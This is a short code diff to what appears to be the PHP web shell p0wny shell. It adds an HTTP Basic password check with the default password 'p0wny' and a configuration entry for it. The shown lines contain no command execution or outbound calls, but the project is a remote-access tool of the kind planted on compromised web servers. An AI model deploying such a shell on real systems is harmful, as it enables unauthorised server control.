@@ -3,6 +3,7 @@
 $SHELL_CONFIG = [
     'username' => 'p0wny',
     'hostname' => 'shell',
+    'authpass' => 'p0wny', // change this! leave blank to disable auth
 ];
 
 function expandPath($path) {
@@ -153,6 +154,18 @@ function initShellConfig() {
     $hostname = gethostname();
     if ($hostname !== false) {
         $SHELL_CONFIG['hostname'] = $hostname;
+    }
+}
+
+if ($SHELL_CONFIG['authpass']) {
+    if (
+        !isset($_SERVER['PHP_AUTH_PW']) ||
+        $_SERVER['PHP_AUTH_PW'] !== $SHELL_CONFIG['authpass']
+    ) {
+        header('WWW-Authenticate: Basic realm="p0wny shell"');
+        header('HTTP/1.0 401 Unauthorized');
+        echo 'Unauthorized';
+        exit;
     }
 }
 
